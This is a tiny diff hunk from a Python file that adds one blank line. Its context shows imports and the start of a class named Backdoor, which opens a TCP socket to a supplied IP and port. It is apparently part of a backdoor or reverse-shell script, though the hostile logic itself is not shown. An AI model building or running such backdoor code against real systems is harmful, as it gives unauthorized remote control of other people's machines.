@@ -4,6 +4,7 @@ import json
 import os
 import base64
 import sys
+
 class Backdoor:
     def __init__(self,ip,port):
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
